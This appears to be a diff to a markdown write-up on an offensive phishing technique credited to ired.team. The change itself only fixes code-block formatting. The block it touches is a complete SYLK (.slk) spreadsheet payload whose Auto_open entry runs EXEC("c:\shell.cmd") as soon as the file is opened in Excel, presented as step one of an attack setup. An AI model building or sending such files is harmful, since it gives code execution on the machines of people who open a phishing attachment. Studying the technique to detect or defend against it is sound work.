@@ -33,14 +33,14 @@ I found this exploit on [ired.team](https://ired.team/offensive-security/phishin
 
 #### Setup
 1. Create an new text file, put the the below code and save it as .slk file:
-`
+```
 ID;P
 O;E
 NN;NAuto_open;ER101C1;KOut Flank;F
 C;X1;Y101;K0;EEXEC("c:\shell.cmd")
 C;X1;Y102;K0;EHALT()
 E
-`
+```
 
 2.
 3.
